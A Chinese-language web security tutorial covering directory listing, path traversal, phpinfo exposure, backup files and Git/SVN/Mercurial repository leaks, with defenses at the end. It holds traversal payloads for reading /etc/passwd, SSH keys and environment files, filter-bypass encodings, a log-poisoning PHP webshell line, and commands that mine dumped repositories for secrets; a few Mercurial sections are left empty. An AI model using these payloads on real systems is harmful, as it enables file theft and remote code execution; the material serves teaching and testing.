# 1 目录遍历

## 1.1 是什么

目录遍历（Directory Traversal / Path Traversal）是指 Web 服务器或应用程序**错误地将目录列表暴露给用户**，或者允许攻击者通过构造路径跳出 Web 根目录，访问服务器上任意文件的漏洞。

两种形态：

| 形态                              | 说明                                                 |
| --------------------------------- | ---------------------------------------------------- |
| **目录列表（Directory Listing）** | 服务器将某个目录下的所有文件名直接列出来显示在页面上 |
| **路径穿越（Path Traversal）**    | 通过 `../` 跳出 Web 根目录，读取系统任意文件         |

## 1.2 目录列表泄露

### 1.2.1 成因

Web 服务器（Apache、Nginx、IIS 等）在某个目录下**没有默认首页文件**（如 `index.html`、`index.php`）时，如果开启了目录列表功能，就会把该目录下的所有文件和子目录直接罗列出来。

**Apache 中开启目录列表的配置**（不安全）：

```apache
<Directory /var/www/html>
    Options Indexes FollowSymLinks   # Indexes 就是开启目录列表
</Directory>
```

### 1.2.2 危害

- 暴露网站的目录结构和文件名
- 泄露备份文件（`.zip`、`.bak`、`.sql`）
- 泄露配置文件、日志文件、源代码
- 为后续攻击提供精确的路径信息

### 1.2.3 发现方式

直接访问目标目录，观察是否出现类似如下的页面：

```
Index of /uploads
[DIR] images/      2026-01-01 12:00
[   ] config.bak   2026-01-01 12:00   2.3K
[   ] db.sql       2026-01-01 12:00   15K
```

**常见的高价值目录**：

```
/uploads/
/backup/
/admin/
/config/
/logs/
/tmp/
/install/
/.git/
```

### 1.2.4 防御

```apache
# Apache：关闭目录列表
Options -Indexes

# Nginx：默认关闭，确认配置中没有以下内容
autoindex on;   # 不能有这行
```

## 1.3 路径穿越（../）

### 1.3.1 原理

当应用程序根据用户输入读取文件时，如果未对路径进行过滤，攻击者可以使用 `../`（上级目录）不断跳出 Web 根目录，最终读取系统任意文件。

**漏洞代码示例（PHP）**：

```php
// 用户通过 ?file=xxx 指定要读取的文件
$file = $_GET['file'];
include('/var/www/html/pages/' . $file);
// 没有任何过滤，直接拼接路径
```

**攻击 payload**：

```
?file=../../../etc/passwd
```

**实际拼接结果**：

```
/var/www/html/pages/../../../etc/passwd
→ 等价于 /etc/passwd
```

### 1.3.2 常见目标文件

**Linux 系统**：

```
/etc/passwd              # 用户账号信息（含用户名、家目录）
/etc/shadow              # 密码哈希（需 root 权限）
/etc/hosts               # 本地 DNS 解析，可发现内网结构
/etc/crontab             # 定时任务
/proc/self/environ       # 当前进程环境变量（可能含 SECRET_KEY）
/proc/self/cmdline       # 当前进程启动命令
/proc/net/tcp            # 网络连接信息
/root/.ssh/id_rsa        # SSH 私钥（高危）
/var/log/apache2/access.log  # Apache 访问日志（配合日志注入 GetShell）
/var/log/nginx/access.log    # Nginx 访问日志
```

**Windows 系统**：

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM      # 密码哈希数据库（通常被锁定）
C:\inetpub\wwwroot\web.config       # IIS 配置文件
C:\xampp\mysql\data\mysql\user.MYD  # MySQL 用户数据
```

**Web 应用配置**：

```
/var/www/html/config.php
/var/www/html/.env           # Laravel 等框架的环境配置
/var/www/html/wp-config.php  # WordPress 数据库配置
/app/config/database.yml     # Rails 数据库配置
```

### 1.3.3 编码绕过过滤

当应用程序过滤了 `../` 时，可以尝试以下编码方式：

| 编码方式             | payload                                 |
| -------------------- | --------------------------------------- |
| URL 编码             | `%2e%2e%2f`（`../`）                    |
| 双重 URL 编码        | `%252e%252e%252f`                       |
| Unicode 编码         | `..%c0%af`（`/` 的 Unicode 变体）       |
| 路径截断（Windows）  | `../`、`..\`、`..\\`                    |
| 多余字符（部分过滤） | `....//`（过滤一次 `../` 后变成 `../`） |
| 绝对路径             | 直接用 `/etc/passwd` 跳过 `../`         |

**实际测试**：

```
?file=../../../etc/passwd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=....//....//....//etc/passwd
?file=/etc/passwd
```

### 1.3.4 配合日志注入 GetShell

**前提**：

1. 能通过路径穿越读取 Web 服务器访问日志（如 `/var/log/apache2/access.log`）
2. 日志中会原样记录 User-Agent 等请求头

**攻击步骤**：

```
第一步：发送含 PHP 代码的请求，使其写入日志
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

第二步：通过路径穿越包含日志文件
?file=../../../var/log/apache2/access.log&cmd=id

第三步：日志被 PHP 解析，代码执行，命令输出回显
```

# 2 PHPINFO 泄露

## 2.1 是什么

`phpinfo()` 是 PHP 内置函数，会输出当前 PHP 环境的所有配置信息。如果开发者将调用了 `phpinfo()` 的页面遗留在生产环境中（如 `info.php`、`test.php`、`phpinfo.php`），攻击者就能从中获取大量敏感信息。

## 2.2 泄露的敏感信息

### 2.2.1 系统与环境信息

```
PHP 版本         → 判断可用的漏洞和函数限制
操作系统版本     → 内核提权漏洞判断
服务器软件       → Apache/Nginx 版本，判断已知漏洞
Server API       → CGI/FPM/CLI，影响利用方式
```

### 2.2.2 路径信息

```
DOCUMENT_ROOT    → Web 根目录绝对路径（写 Shell 的关键）
SCRIPT_FILENAME  → 当前脚本的绝对路径
sys_temp_dir     → 临时文件目录
include_path     → PHP 文件包含搜索路径
```

**这里的 `DOCUMENT_ROOT` 是 SQL 注入 INTO OUTFILE 写 Webshell 时最需要的信息。**

### 2.2.3 PHP 安全配置

```
disable_functions    → 被禁用的函数列表（如 system、exec、shell_exec）
open_basedir         → 文件访问限制的目录范围
allow_url_include    → 是否允许远程文件包含（RFI）
allow_url_fopen      → 是否允许 URL 文件操作
magic_quotes_gpc     → 是否自动转义（影响 SQL 注入利用）
```

### 2.2.4 已加载的扩展

```
curl、mysqli、pdo    → 数据库和网络请求能力
gd、imagick          → 图像处理（影响文件上传绕过）
```

### 2.2.5 环境变量（$_SERVER / $_ENV）

```
HTTP_HOST            → 服务器域名
SERVER_ADDR          → 服务器 IP
HTTP_X_FORWARDED_FOR → 真实 IP
各种 KEY、TOKEN、SECRET → 如果通过环境变量注入了敏感配置
```

**这里最危险：某些开发团队习惯把 SECRET_KEY、数据库密码等通过环境变量传入，phpinfo 会把它们全部打印出来。**

## 2.3 发现方式

```
常见文件名（直接访问）：
/phpinfo.php
/info.php
/test.php
/php.php
/i.php
/1.php
/?info
/?phpinfo
/index.php?a=phpinfo()   # 某些框架会直接执行参数
```

**自动化工具扫描**：dirsearch、gobuster、ffuf 配合 phpinfo 字典。

## 2.4 与其他漏洞的配合

| 配合漏洞            | 利用方式                                           |
| ------------------- | -------------------------------------------------- |
| SQL 注入写 Webshell | 从 phpinfo 获取 `DOCUMENT_ROOT`                    |
| 文件包含            | 从 phpinfo 获取临时文件路径，配合文件包含 GetShell |
| 反序列化            | 从 phpinfo 获取 PHP 版本，判断可用的反序列化利用链 |
| 命令执行绕过        | 从 `disable_functions` 列表判断哪些函数可用        |

### phpinfo 配合文件包含 GetShell（经典技巧）

**原理**：PHP 在处理文件上传时，会将上传的文件先存入 `/tmp/phpXXXXXX` 临时文件，处理完毕后删除。phpinfo 会将这个临时文件名打印出来（`_FILES` 部分）。如果在 phpinfo 响应返回和临时文件被删除之间存在竞争窗口，配合本地文件包含（LFI）包含该临时文件，就能执行其中的 PHP 代码。

```
竞争流程：
① 发送含 PHP 代码的文件上传请求到 phpinfo.php
  → phpinfo 回显临时文件路径（如 /tmp/phpAb1234）
② 在临时文件被删除前，LFI 包含该路径
  → ?file=/tmp/phpAb1234
③ 临时文件中的 PHP 代码被执行 → GetShell
```

# 3 备份文件下载

## 3.1 是什么

开发者或运维人员在服务器上遗留的备份文件，由于命名规则有规律、权限配置不当，导致攻击者可以通过猜测路径直接下载，从而获取源代码、数据库内容、配置密钥等高度敏感的信息。

## 3.2 常见备份文件类型

### 3.2.1 源代码备份

| 文件名规律               | 说明                                               |
| ------------------------ | -------------------------------------------------- |
| `index.php.bak`          | 原文件名加 `.bak`                                  |
| `index.php~`             | 文本编辑器（vim、gedit）产生的临时备份             |
| `index.php.swp`          | **vim 崩溃时留下的交换文件**（高危，包含完整源码） |
| `index.php.swo`          | vim 交换文件的另一种命名                           |
| `web.zip` / `web.tar.gz` | 整站打包备份                                       |
| `backup.zip`             | 备份压缩包                                         |
| `wwwroot.rar`            | Windows 环境常见备份命名                           |

### 3.2.2 数据库备份

```
db.sql
database.sql
backup.sql
数据库名.sql
网站名_db.sql
dump.sql
mysql.sql
```

### 3.2.3 配置文件备份

```
config.php.bak
config.inc.php.bak
database.php.bak
.env.bak
settings.py.bak
```

### 3.2.4 vim 交换文件（重点）

> vim 在编辑文件时，会在同目录下生成 `.文件名.swp` 的隐藏交换文件。如果 vim 异常退出（SSH 断连等），该文件不会被自动删除，且包含编辑中的完整文件内容。

**命名规律**：

```
编辑 index.php 时：
第一次产生：.index.php.swp
第二次产生：.index.php.swo
第三次产生：.index.php.swn
```

**恢复方法**（在本地）：

```bash
# 下载 .swp 文件后，用 vim 恢复
vim -r .index.php.swp
# 恢复后另存为查看内容
:w recovered.php
```

**请求示例**：

```
GET /.index.php.swp HTTP/1.1
GET /config.php~ HTTP/1.1
GET /admin.php.bak HTTP/1.1
```

## 3.3 整站备份压缩包（重点）

### 3.3.1 常见命名规律

```
# 以网站名命名
web.zip / web.tar.gz / web.rar
wwwroot.zip / wwwroot.tar.gz
html.zip / public.zip

# 以日期命名
backup_20260101.zip
www_2026-01-01.tar.gz

# 以域名命名
example.com.zip
example_com_backup.zip

# 通用名
backup.zip / bak.zip
code.zip / src.zip
upload.tar.gz
```

### 3.3.2 发现方式

**手工猜测**：根据网站名、域名、常见规律构造路径访问。

**自动化工具**：

```bash
# dirsearch（支持备份文件字典）
dirsearch -u http://target.com -e zip,tar.gz,bak,sql,swp

# 专用工具 bfac（Backup File Artifacts Checker）
bfac --url http://target.com/index.php --level 4
```

### 3.3.3 获取后的价值

```
源代码     → 白盒审计，发现更多漏洞
数据库文件  → 直接获取用户名密码（可能是明文或弱哈希）
配置文件   → 数据库连接密码、SECRET_KEY、API 密钥
```

# 4 Git 泄露

## 4.1 是什么

开发者在部署 Web 应用时，**将本地的 `.git` 目录连同源代码一起上传到了服务器**，导致攻击者可以通过访问 `/.git/` 路径下载整个 Git 仓库，从而还原出完整的源代码（包括历史提交中删除的敏感信息）。

## 4.2 为什么危险

Git 仓库中可能包含：

```
完整的源代码（包括所有历史版本）
配置文件（数据库密码、API Key、SECRET_KEY）
曾经提交后又删除的密码（在 git log 历史中仍然存在）
内网地址、服务器结构等敏感注释
```

## 4.3 判断是否存在 Git 泄露

直接访问以下路径，观察响应：

```
/.git/HEAD
/.git/config
/.git/index
```

**正常响应**（存在泄露）：

```
# /.git/HEAD 返回
ref: refs/heads/master

# /.git/config 返回
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
[remote "origin"]
    url = https://github.com/company/private-repo.git
    fetch = +refs/heads/*:refs/heads/*
```

看到上述内容 → **确认 Git 仓库泄露**。

## 4.4 利用方式

### 4.4.1 手工下载（了解原理）

Git 仓库的核心文件结构：

```
.git/
├── HEAD           → 当前分支指针（如 ref: refs/heads/master）
├── config         → 仓库配置
├── index          → 暂存区索引
├── COMMIT_EDITMSG → 最后一次提交信息
├── objects/       → 所有 Git 对象（commit、tree、blob）
│   ├── pack/      → 打包的对象
│   └── ab/cdef... → 散列存储的对象
└── refs/
    └── heads/
        └── master → master 分支的最新 commit hash
```

**手工还原流程**（了解即可，实战用工具）：

```bash
# 1. 读取 HEAD 获取当前分支
curl http://target.com/.git/HEAD
# → ref: refs/heads/master

# 2. 读取 master 分支的最新 commit hash
curl http://target.com/.git/refs/heads/master
# → a1b2c3d4e5f6...（40位哈希）

# 3. 读取该 commit 对象
curl http://target.com/.git/objects/a1/b2c3d4e5f6...
# → 二进制数据，需用 git cat-file 解析

# 4. 逐层解析 tree → blob，还原文件内容
```

### 4.4.2 自动化工具（实战首选）

#### GitHack

```bash
# 安装
git clone https://github.com/BugScanTeam/GitHack.git

# 使用（自动下载并还原源码）
python GitHack.py http://target.com/.git/
# 还原的文件保存在 dist/ 目录下
```

#### git-dumper（更稳定）

```bash
# 安装
pip install git-dumper

# 使用
git-dumper http://target.com/.git/ output_dir/

# 还原后可以正常使用 git 命令查看历史
cd output_dir/
git log --oneline          # 查看提交历史
git show <commit_hash>     # 查看某次提交的详细变更
```

#### githack / scrabble

适用于目录列表被关闭、只能逐文件请求的情况，通过解析 `.git/index` 获取文件列表后逐一下载。

### 4.4.3 还原后的分析

```bash
# 查看所有提交历史（按时间倒序）
git log --oneline --all

# 查看某次提交的具体改动（重点看删除了什么）
git show <commit_hash>

# 搜索历史中的敏感关键词
git log -p | grep -i "password\|secret\|key\|token\|passwd"

# 查看所有分支
git branch -a

# 切换到其他分支查看
git checkout <branch_name>

# 对比两次提交的差异
git diff <commit1> <commit2>
```

**重点关注**：被删除的文件、历史提交中改动过的配置文件、注释中的密码。

## 4.5 常用 Git 指令速查

> 还原仓库后，以下是信息收集时最常用的 Git 命令，按使用场景分类。

### 4.5.1 查看历史提交

```bash
# 单行简洁显示所有提交（含所有分支）
git log --oneline --all

# 详细显示（含作者、时间、完整 hash）
git log --all

# 图形化显示分支合并关系
git log --oneline --all --graph

# 只看最近 N 条提交
git log --oneline -10

# 按作者过滤
git log --author="username"

# 按时间范围过滤
git log --after="2025-01-01" --before="2026-01-01"

# 按关键词过滤提交信息
git log --grep="password"
git log --grep="fix" --grep="secret" --all-match   # 同时包含两个关键词
```

### 4.5.2 查看提交内容

```bash
# 查看某次提交的详细改动（diff）
git show <commit_hash>

# 只看某次提交改动了哪些文件（不看具体内容）
git show --stat <commit_hash>

# 查看某次提交中某个具体文件的内容
git show <commit_hash>:路径/文件名.php

# 查看当前 HEAD（最新提交）的改动
git show HEAD

# 查看倒数第二次提交
git show HEAD~1
```

### 4.5.3 搜索敏感信息

```bash
# 在所有历史提交的 diff 中搜索关键词（最常用）
git log -p --all | grep -i "password"
git log -p --all | grep -i "secret\|key\|token\|passwd\|apikey"

# 在当前工作目录的所有文件内容中搜索
git grep "password"
git grep -i "secret_key"           # 忽略大小写
git grep -n "database_password"    # 显示行号
git grep -l "password"             # 只显示文件名

# 在某个历史版本中搜索
git grep "password" <commit_hash>

# 用 git log -S 搜索"某个字符串曾经在哪次提交中被增加或删除"
git log -S "password123" --all
git log -S "SECRET_KEY" --oneline --all
```

### 4.5.4 分支与标签操作

```bash
# 查看所有本地分支
git branch

# 查看所有分支（含远程）
git branch -a

# 切换到某个分支
git checkout <branch_name>
git switch <branch_name>      # 新版 Git 写法

# 查看所有标签（tag，通常对应版本发布）
git tag

# 切换到某个标签对应的版本
git checkout <tag_name>

# 查看远程仓库信息（可能暴露内网仓库地址）
git remote -v
```

### 4.5.5 文件历史与恢复

```bash
# 查看某个文件的完整修改历史
git log --follow -p -- 文件名.php

# 查看某个文件在所有提交中的变化摘要
git log --oneline -- config.php

# 恢复某个历史版本中的文件（即使现在已被删除）
git checkout <commit_hash> -- config.php

# 查看某个文件在某次提交时的完整内容
git show <commit_hash>:config.php

# 查找某个文件是在哪次提交中被删除的
git log --all --full-history -- "**/config.php"

# 查看工作目录与暂存区的差异
git diff

# 查看暂存区与最新提交的差异
git diff --cached
```

### 4.5.6 底层对象操作（手工分析时使用）

```bash
# 查看某个 Git 对象的类型（commit / tree / blob / tag）
git cat-file -t <hash>

# 查看某个 Git 对象的内容
git cat-file -p <hash>

# 查看 commit 对象（包含 tree hash、parent hash、作者、提交信息）
git cat-file -p a1b2c3d4

# 查看 tree 对象（目录结构，包含子 tree 和 blob 的 hash）
git cat-file -p <tree_hash>

# 查看 blob 对象（文件内容）
git cat-file -p <blob_hash>

# 列出所有 Git 对象（从 objects/ 目录）
git cat-file --batch-all-objects --batch-check

# 解析 .git/index 暂存区，列出所有被跟踪的文件
git ls-files
git ls-files --stage    # 显示 hash 和权限
```

### 4.5.7 综合利用流程（实战模板）

```bash
# ① 工具还原仓库
git-dumper http://target.com/.git/ ./target_repo
cd ./target_repo

# ② 查看仓库基本情况
git log --oneline --all --graph    # 全貌
git branch -a                      # 所有分支
git remote -v                      # 远程仓库地址（可能暴露内网）
git tag                            # 所有版本标签

# ③ 快速搜索敏感信息
git log -p --all | grep -iE "password|secret|key|token|passwd|credential"

# ④ 重点查看配置文件历史
git log --oneline -- config.php
git log --oneline -- .env
git log --oneline -- database.yml

# ⑤ 恢复已删除的敏感文件
git log --all --full-history -- "**/.env"        # 找到删除该文件的提交
git checkout <删除前的commit_hash> -- .env       # 恢复文件内容

# ⑥ 对比关键节点的差异
git diff <旧commit> <新commit> -- config.php
```

## 4.6 特殊场景：git log 中的敏感信息

开发者有时会提交包含密码的配置文件，发现后虽然删除并重新提交，但历史记录中仍然存在：

```bash
# 还原某个历史版本中已被删除的文件
git checkout <旧commit_hash> -- config.php

# 或者直接查看该文件在历史版本中的内容
git show <旧commit_hash>:config.php

# 用 -S 精确定位密码是在哪次提交中写入的
git log -S "db_password_here" --oneline --all
```

# 5 SVN 泄露

## 5.1 是什么

SVN（Subversion）是另一种版本控制系统。当开发者使用 SVN 管理代码并部署时，如果将 `.svn` 目录一同上传到服务器，攻击者就可以访问 `/.svn/` 路径，下载源代码和历史版本信息。

## 5.2 与 Git 泄露的区别

| 对比点   | Git 泄露            | SVN 泄露                           |
| -------- | ------------------- | ---------------------------------- |
| 特征路径 | `/.git/HEAD`        | `/.svn/entries` 或 `/.svn/wc.db`   |
| 仓库结构 | 分布式，对象存储    | 集中式，工作副本                   |
| 核心文件 | `objects/`、`refs/` | `entries`（旧版）、`wc.db`（新版） |
| 常用工具 | git-dumper、GitHack | dvcs-ripper、SvnExploit            |

## 5.3 判断是否存在 SVN 泄露

```
# 旧版 SVN（1.6 及以下）：entries 文件
/.svn/entries

# 新版 SVN（1.7 及以上）：SQLite 数据库
/.svn/wc.db

# 通用验证
/.svn/
```

**旧版 entries 文件内容示例**（明文存储文件路径）：

```
10               ← SVN 格式版本号
dir
http://svn.company.com/repo/trunk    ← SVN 仓库地址（暴露内网 URL）
http://svn.company.com/repo

index.php        ← 文件名直接列出
file
...
config.php
file
...
```

**从 entries 中可以直接读取到**：所有文件名、SVN 仓库的内网地址、版本号。

**新版 wc.db** 是一个 SQLite 数据库文件，包含工作副本的完整信息，可用 SQLite 工具打开查看。

## 5.4 利用方式

### 5.4.1 手工提取（旧版）

```bash
# 1. 下载 entries 文件，获取所有文件名列表
curl http://target.com/.svn/entries

# 2. 逐一下载各文件的文本内容
# 旧版 SVN 文件存储在 .svn/text-base/ 目录
curl http://target.com/.svn/text-base/index.php.svn-base
curl http://target.com/.svn/text-base/config.php.svn-base
# .svn-base 文件就是原始源代码文件
```

### 5.4.2 自动化工具

#### dvcs-ripper

```bash
# 安装
git clone https://github.com/kost/dvcs-ripper.git
cd dvcs-ripper
cpan install LWP::Protocol::https   # 安装依赖

# 使用（自动下载 SVN 仓库）
perl rip-svn.pl -v -u http://target.com/.svn/
```

#### SvnExploit

```bash
# 适用于新版 SVN（wc.db）
git clone https://github.com/admintony/svnExploit.git
python SvnExploit.py -u http://target.com/.svn/ -a
```

### 5.4.3 wc.db 分析

```bash
# 下载 wc.db
wget http://target.com/.svn/wc.db

# 用 sqlite3 打开
sqlite3 wc.db

# 查看所有节点（文件和目录信息）
sqlite> SELECT local_relpath, checksum FROM NODES;
# local_relpath → 文件相对路径
# checksum      → 文件 SHA1 哈希值，用于在 pristine/ 目录下找到原始文件

# 根据 checksum 下载原始文件
# pristine/ 目录下存储了原始文件内容
# 路径格式：.svn/pristine/ab/abcdef1234...sha1值.svn-base
```

## 5.5 常用 SVN 指令速查

> 用工具还原或 checkout 出本地副本后，使用以下 svn 命令进行分析。

### 5.5.1 检出与更新

```bash
# 从 SVN 仓库检出（需要知道仓库地址，通常从 entries/wc.db 中读取）
svn checkout http://svn.company.com/repo/trunk ./output
svn co http://svn.company.com/repo/trunk ./output    # co 是 checkout 的缩写

# 检出指定版本号的历史副本
svn checkout -r 100 http://svn.company.com/repo/trunk ./output_r100

# 检出整个仓库（含所有分支和标签）
svn checkout http://svn.company.com/repo ./full_repo

# 更新本地副本到最新版本
svn update
svn up              # 缩写

# 更新到指定版本
svn update -r 50
```

### 5.5.2 查看历史提交

```bash
# 查看提交日志
svn log

# 查看指定版本范围的日志
svn log -r 1:HEAD       # 从第 1 版到最新版
svn log -r 100:200      # 第 100 到 200 版

# 查看某个具体版本的提交信息
svn log -r 150

# 查看某个文件的历史日志
svn log 文件名.php
svn log -r 1:HEAD 文件名.php
```

### 5.5.3 查看文件内容与差异

```bash
# 查看某个版本的文件内容（不需要先 checkout）
svn cat -r 100 http://svn.company.com/repo/trunk/config.php

# 查看工作副本中某文件与仓库版本的差异
svn diff 文件名.php

# 查看两个版本之间某文件的差异
svn diff -r 100:200 config.php

# 查看某个版本的完整变更内容（类似 git show）
svn diff -c 150         # -c = --change，等价于 -r 149:150
```

### 5.5.4 查看仓库结构

```bash
# 列出仓库中的文件和目录
svn list http://svn.company.com/repo/trunk
svn ls http://svn.company.com/repo/trunk    # 缩写

# 递归列出所有文件
svn list -R http://svn.company.com/repo/trunk

# 查看工作副本的详细信息（仓库地址、当前版本号等）
svn info
svn info http://svn.company.com/repo    # 查看远程仓库信息
```

### 5.5.5 搜索敏感信息

```bash
# 在工作副本所有文件中搜索关键词
grep -r "password" .
grep -ri "secret_key\|api_key\|database_password" .

# 在所有历史版本的提交信息中搜索
svn log -r 1:HEAD | grep -i "password\|fix\|remove\|delete\|secret"

# 查看某个敏感文件在所有版本中的变化，找到写入密码的版本号后查看内容
svn log -r 1:HEAD config.php
svn cat -r <版本号> config.php
```

### 5.5.6 恢复历史版本文件

```bash
# 将某个文件恢复到指定历史版本（即使当前已被删除）
svn cat -r 80 http://svn.company.com/repo/trunk/config.php > config_r80.php

# 将整个工作副本回滚到指定版本
svn update -r 80

# 查找某个文件是在哪个版本被删除的（-v 显示每次提交涉及的文件列表）
svn log -r 1:HEAD -v http://svn.company.com/repo/trunk/config.php
```

### 5.5.7 综合利用流程（实战模板）

```bash
# ① 从泄露的 entries 中获取仓库地址
curl http://target.com/.svn/entries
# → 提取出 http://svn.company.com/repo/trunk

# ② 直接 checkout 整个仓库（若内网可达）
svn checkout http://svn.company.com/repo/trunk ./output

# ③ 若内网不可达，用 dvcs-ripper 通过 Web 接口还原
perl rip-svn.pl -v -u http://target.com/.svn/

# ④ 查看基本情况
svn info
svn log -r 1:HEAD | head -100

# ⑤ 搜索敏感信息

# ⑥ 重点检查配置文件的历史版本
svn log -r 1:HEAD config.php
svn cat -r <目标版本> config.php
```

# 6 HG 泄露

## 6.1 是什么

HG（Mercurial）是第三种常见的分布式版本控制系统（与 Git 类似）。当 Mercurial 仓库的 `.hg` 目录被部署到 Web 服务器时，攻击者可以访问并下载仓库内容，还原完整源代码。

## 6.2 判断是否存在 HG 泄露

```
# 验证路径
/.hg/
/.hg/store/
/.hg/dirstate
/.hg/requires
```

**`.hg/requires` 文件内容示例**：

```
dotencode
fncache
generaldelta
store
```

看到此类内容 → **确认 Mercurial 仓库泄露**。

## 6.3 HG 仓库结构

```
.hg/
├── requires       → 仓库功能特性列表
├── dirstate       → 工作目录状态（已跟踪文件列表）
├── hgrc           → 仓库配置（可能含远程仓库地址）
├── store/         → 存储区
│   ├── 00manifest.i  → 文件清单索引
│   ├── 00changelog.i → 变更历史索引
│   └── data/      → 文件数据（.i 索引 + .d 数据）
└── cache/
```

## 6.4 利用方式

### 6.4.1 自动化工具（dvcs-ripper）

```bash
# dvcs-ripper 同时支持 Git、SVN、HG
perl rip-hg.pl -v -u http://target.com/.hg/
# 下载并还原的文件保存在当前目录
```

### 6.4.2 手工分析

```bash
# 下载 dirstate 查看文件列表（二进制格式，需要解析）
wget http://target.com/.hg/dirstate

# 下载 hgrc 配置文件（明文）
curl http://target.com/.hg/hgrc
# 内容示例：
# [paths]
# default = http://hg.company.com/internal-repo   ← 内网仓库地址
```

## 6.5 常用 HG 指令速查

> 用 dvcs-ripper 还原或直接 clone 仓库后，使用以下 hg 命令进行分析。

### 6.5.1 克隆与初始化

```bash
# 从远程仓库克隆（仓库地址从 .hg/hgrc 中读取）
hg clone http://hg.company.com/internal-repo ./output

# 查看仓库基本信息

```

### 6.5.2 查看历史提交

```bash
# 查看提交历史（默认显示所有）
hg log

# 单行简洁显示
hg log --template "{rev}: {desc}\n"

# 查看最近 N 条
hg log -l 10

# 查看指定版本号的提交信息

# 查看某个文件的提交历史
hg log 文件名.php
hg log -f 文件名.php    # -f 追踪文件重命名历史

# 查看某个版本范围
hg log -r "10:20"
```

### 6.5.3 查看文件内容与差异

```bash
# 查看某个历史版本的文件内容
hg cat -r 50 config.php

# 查看当前版本某文件内容
hg cat 文件名.php

# 查看两个版本之间的差异
hg diff -r 40:50

# 查看工作目录与父版本的差异
hg diff
```

### 6.5.4 查看仓库结构

```bash

hg manifest

# 列出某个历史版本的所有文件
hg manifest -r 50

# 查看工作目录状态

hg st           # 缩写

# 查看所有分支
hg branches

# 查看所有标签（tag）
hg tags
```

### 6.5.5 搜索敏感信息

```bash
# 在当前工作目录所有文件中搜索
grep -r "password" .
grep -ri "secret\|key\|token\|passwd" .

# 在所有历史提交信息中搜索
hg log | grep -i "password\|remove\|delete\|fix"

# 在所有历史版本的文件变更中搜索（类似 git log -p）
hg log -p | grep -i "password\|secret_key"

# 用 hg grep 在历史版本中搜索某个字符串曾出现在哪个版本

hg grep "SECRET_KEY" -r 1:HEAD  # 指定版本范围

```

### 6.5.6 恢复历史版本文件

```bash

# ⑤ 搜索敏感信息
```

# 综合对比与速查

## 各类信息泄露特征速查

| 类型     | 验证路径                         | 主要危害                       | 常用工具                |
| -------- | -------------------------------- | ------------------------------ | ----------------------- |
| 目录遍历 | 直接访问目录，看是否有文件列表   | 暴露文件结构，下载敏感文件     | dirsearch、手工         |
| 路径穿越 | `?file=../../../etc/passwd`      | 读取系统任意文件               | 手工、burp              |
| PHPINFO  | `/phpinfo.php`、`/info.php`      | 路径、版本、配置、环境变量泄露 | 手工、dirsearch         |
| 备份文件 | `/web.zip`、`/.index.php.swp`    | 源码、数据库、配置文件         | dirsearch、bfac         |
| Git 泄露 | `/.git/HEAD`                     | 完整源码+历史版本              | git-dumper、GitHack     |
| SVN 泄露 | `/.svn/entries` 或 `/.svn/wc.db` | 完整源码+仓库地址              | dvcs-ripper、SvnExploit |
| HG 泄露  | `/.hg/requires`                  | 完整源码+历史版本              | dvcs-ripper             |

## 信息收集优先级

```
发现信息泄露后，按以下优先级提取信息：

① 密钥类      SECRET_KEY、API_KEY、数据库密码  → 直接影响后续漏洞利用
② 路径类      DOCUMENT_ROOT、Web 绝对路径       → 配合 SQL 注入写 Shell
③ 源码类      完整 PHP/Python/Java 源码          → 白盒审计发现更多漏洞
④ 配置类      数据库连接信息、SMTP 配置          → 横向扩展攻击面
⑤ 结构类      目录结构、文件名、内网地址          → 进一步信息收集
```

## 防御总结

| 防御措施                                                     | 针对的漏洞   |
| ------------------------------------------------------------ | ------------ |
| Web 服务器关闭目录列表（`Options -Indexes`）                 | 目录遍历     |
| 对用户输入的文件路径做白名单校验，禁止 `../`                 | 路径穿越     |
| 生产环境删除 `phpinfo.php`、`test.php` 等调试页面            | PHPINFO 泄露 |
| 部署前删除备份文件，或将备份存放在 Web 根目录之外            | 备份文件下载 |
| 部署时将 `.git`、`.svn`、`.hg` 加入 `.gitignore` 或配置 Web 服务器拒绝访问 | 版本控制泄露 |
| Nginx 配置拒绝访问隐藏目录                                   | 版本控制泄露 |

```nginx
# Nginx 禁止访问所有隐藏目录和文件（以 . 开头）
location ~ /\. {
    deny all;
    return 404;
}
# Apache 禁止访问 .git、.svn、.hg 目录
<DirectoryMatch "^/.*(\.git|\.svn|\.hg)">
    Order deny,allow
    Deny from all
</DirectoryMatch>
```
